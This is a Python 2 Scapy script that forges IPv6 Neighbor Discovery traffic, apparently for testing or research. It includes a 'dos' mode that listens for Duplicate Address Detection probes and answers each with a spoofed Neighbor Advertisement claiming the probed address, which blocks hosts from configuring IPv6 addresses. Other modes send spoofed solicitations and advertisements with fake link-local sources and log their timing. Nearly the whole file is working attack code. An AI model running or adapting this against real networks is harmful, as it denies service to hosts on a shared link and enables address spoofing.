# coding:utf-8
#! /usr/bin/env python

from scapy.all import *
import random
import datetime

ifaceName = ["enp0s31f6","docker0"]

globalSrcAddr = "2001:db8:0:1:c0bc:a2a0:21d6:6a0b"
globalDstAddr = "ff02::1"

linkSrcAddr = "fe80::437f:2137:3e16:b6ea"
linkOtherSrcAddr = "fe80::437f:2137:3e16:b6eb"
linkDstAddr = "ff02::1"
linkFakeSrc = "fe80::437f:2137:3e16:ffff"

macSrcAddr = "8c:ec:4b:73:25:8d"
macMultiAddr = "33:33:ff:e4:89:00"

def dos_on_dad(pkt):
    if IPv6 in pkt:
        if ICMPv6ND_NS in pkt:
            if pkt[IPv6].src == "::":
                print "ether src:",pkt[Ether].src
                print "ether dst:",pkt[Ether].dst
                print "ipv6 src:",pkt[IPv6].src
                print "ipv6 dst:",pkt[IPv6].dst
                target_address = pkt[ICMPv6ND_NS].tgt
                print "target address:",target_address
                na_pkt(target_address)

def send_ns_pkt(pkt):
    ns_pkt(linkSrcAddr)

def send_not_dad_ns_pkt(pkt):
    not_dad_ns_pkt(linkSrcAddr)

def send_forge_ns_pkt(pkt):
    forge_ns_pkt_with_fake_src(linkSrcAddr)

def send_na_pkt(pkt):
    na_pkt(linkSrcAddr)

def send_not_dad_na_pkt(pkt):
    not_dad_na_pkt(linkOtherSrcAddr)

def send_forge_na_pkt(pkt):
    forge_na_pkt_with_diff_src_tgr(linkSrcAddr)

def ns_pkt(target_address):
    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
    a=IPv6(src="::", dst='ff02::1:ff21:41f')
    b=ICMPv6ND_NS(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName)

def not_dad_ns_pkt(target_address):
    ether=Ether(src=macSrcAddr,dst=macSrcAddr)
    a=IPv6(src=target_address, dst='ff02::1:ff21:41f')
    b=ICMPv6ND_NS(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName)


def forge_ns_pkt_with_fake_src(target_address):
    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
    a=IPv6(src=linkFakeSrc, dst='ff02::1:ff21:41f')
    b=ICMPv6ND_NS(tgt=target_address)
    print "send NS packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName[0])  

def na_pkt(target_address):
    #segment = target_address.split(":")
    #if segment[0]== "fe80":
    #    print target_address
    #    return
    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
    # ******* LinkLocal Address Forge ************** #
    #a=IPv6(src=linkSrcAddr, dst=linkDstAddr)
    a=IPv6(src=target_address, dst=linkDstAddr)
    # ********** Global Address Forge ************** #
    #a=IPv6(src=globalSrcAddr, dst=globalDstAddr)
    #a=IPv6(src=target_address, dst=globalDstAddr)

    b=ICMPv6ND_NA(tgt=target_address)
    print "send NA packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName[0])

def not_dad_na_pkt(target_address):
    ether=Ether(src=macSrcAddr,dst=macSrcAddr)
    a=IPv6(src=target_address, dst=linkDstAddr)
    b=ICMPv6ND_NA(tgt=target_address)
    print "send NA packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName[0])

def forge_na_pkt_with_diff_src_tgr(target_address):
    ether=Ether(src=macSrcAddr,dst=macMultiAddr)
    a=IPv6(src=linkFakeSrc, dst=linkDstAddr)
    b=ICMPv6ND_NA(tgt=target_address)
    print "send NA packet target address:",target_address
    sendp(ether/a/b,iface=ifaceName[0])

if __name__ == "__main__":
    if len(sys.argv)>1:
        if sys.argv[1] == "ns":
            sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName[0],count=3)
        if sys.argv[1] == "na":
            sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName[0],count=3)
        if sys.argv[1] == "ns-not-dad":
            sniff(filter="ip6",prn=send_not_dad_ns_pkt,iface=ifaceName[0],count=3)
        if sys.argv[1] == "na-not-dad":
            sniff(filter="ip6",prn=send_not_dad_na_pkt,iface=ifaceName[0],count=3)
        if sys.argv[1] == "dos":
            sniff(filter="ip6",prn=dos_on_dad,iface=ifaceName[0],count=3)
    else:
	start = datetime.datetime.now()
	ns_time = []
	forge_ns_time = []
	na_time = []
	forge_na_time = []
	ns_num = 0
	na_num = 0
	pkt_sum = 100
        while True:
            way = random.randint(0,3)
	    ifIdx = random.randint(0,1)
	    if ns_num < pkt_sum: 
            	if way==0:
		    ns_time.append((datetime.datetime.now()-start).seconds*1000)
                    sniff(filter="ip6",prn=send_ns_pkt,iface=ifaceName[ifIdx],count=1)
		    ns_num += 1
                if way==1:
		    forge_ns_time.append((datetime.datetime.now()-start).seconds*1000)
                    sniff(filter="ip6",prn=send_forge_ns_pkt,iface=ifaceName[ifIdx],count=1)
		    ns_num += 1
            if na_num < pkt_sum:
	        if way==2:
		    na_time.append((datetime.datetime.now()-start).seconds*1000)
                    sniff(filter="ip6",prn=send_na_pkt,iface=ifaceName[ifIdx],count=1)
		    na_num += 1
                if way==3:
		    forge_na_time.append((datetime.datetime.now()-start).seconds*1000)
                    sniff(filter="ip6",prn=send_forge_na_pkt,iface=ifaceName[ifIdx],count=1)
		    na_num += 1
	    if ns_num >= pkt_sum and na_num >= pkt_sum:
		break
	    #sleep_time = random.randint(0,10)
	    #time.sleep(0.01*sleep_time)
	print "ns_time:",ns_time
	print "na_time:",na_time
	print "forge_ns_time:",forge_ns_time
	print "forge_na_time:",forge_na_time

